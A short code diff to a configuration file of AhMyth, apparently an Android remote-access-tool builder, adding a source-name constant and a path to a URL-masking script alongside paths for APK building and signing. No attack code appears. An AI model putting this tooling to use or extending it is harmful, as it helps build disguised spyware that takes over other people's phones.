@@ -3,10 +3,12 @@ var path = require("path");
 
 //---------------------App Controller Vars----------------------------------
 exports.apkName = 'Ahmyth.apk';
+exports.apkSourceName = 'Ahmyth';
 exports.signedApkName = 'Ahmyth-aligned-debugSigned.apk';
 exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
 exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
-exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");;
+exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
+exports.maskUrlPython = path.join(__dirname, '..', '..', 'Factory/maskUrl.py').replace("app.asar", "app.asar.unpacked");
 exports.dataDir = 'AhMyth'
 exports.downloadPath = 'Downloads';
 exports.outputApkPath = 'Output';
